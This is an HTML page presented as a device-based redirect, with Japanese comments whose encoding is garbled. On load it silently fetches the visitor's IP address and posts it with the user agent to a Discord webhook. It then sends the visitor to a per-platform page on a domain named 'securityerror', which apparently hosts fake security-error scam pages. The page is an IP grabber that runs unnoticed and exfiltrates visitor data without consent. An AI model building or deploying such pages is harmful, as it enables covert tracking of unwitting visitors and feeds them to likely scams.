<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    // Webhook URLï¼ˆã‚ãªãŸã®Discord webhook URLã«ç½®ãæ›ãˆã¦ãã ã•ã„ï¼‰
    const webhookURL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN";

    // ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆå…ˆãƒãƒƒãƒ”ãƒ³ã‚°
    function getRedirectURL(ua) {
      ua = ua.toLowerCase();
      if (ua.includes("iphone") || ua.includes("ipad")) {
        return "https://securityerror.onrender.com/iOS.html";
      } else if (ua.includes("android")) {
        return "https://securityerror.onrender.com/Android.html";
      } else if (ua.includes("windows")) {
        return "https://securityerror.onrender.com/Windows.html";
      } else if (ua.includes("linux")) {
        return "https://securityerror.onrender.com/Linux.html";
      } else {
        return "https://securityerror.onrender.com/Unknown.html";
      }
    }

    // IPå–å¾— â†’ Webhooké€ä¿¡ â†’ ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ
    async function reportAndRedirect() {
      const ua = navigator.userAgent;
      const redirectURL = getRedirectURL(ua);

      try {
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        // Discord Webhook ã«é€ä¿¡
        await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `ğŸŒ IP: ${ip}\nğŸ“± UA: ${ua}`
          })
        });
      } catch (err) {
        console.error("Webhooké€ä¿¡ã¾ãŸã¯IPå–å¾—ã«å¤±æ•—:", err);
      }

      // æœ€å¾Œã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ
      window.location.href = redirectURL;
    }

    // ãƒšãƒ¼ã‚¸ãƒ­ãƒ¼ãƒ‰æ™‚ã«å®Ÿè¡Œ
    window.onload = reportAndRedirect;
  </script>
</head>
<body>
  <p>ãŠä½¿ã„ã®ç«¯æœ«ã«åˆã‚ã›ã¦ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã—ã¦ã„ã¾ã™...</p>
</body>
</html>
